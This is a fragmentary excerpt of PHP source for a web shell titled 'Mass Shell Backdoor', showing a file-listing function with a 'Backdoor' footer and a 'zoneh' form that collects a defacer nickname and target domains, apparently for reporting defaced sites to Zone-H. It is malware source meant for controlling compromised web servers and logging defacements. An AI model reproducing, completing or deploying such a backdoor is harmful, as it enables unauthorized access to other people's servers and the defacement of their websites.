...
<html>
<head>
<title>Mass Shell Backdoor</title>
...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center>Copyright &copy; ".date("Y")." - <a href='https://google.com/' target='_blank'>".color(1, 2, "Backdoor")."</a></center>";
}
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Mass Shell Backdoor'><br><br>
		    	       Domains: <br>
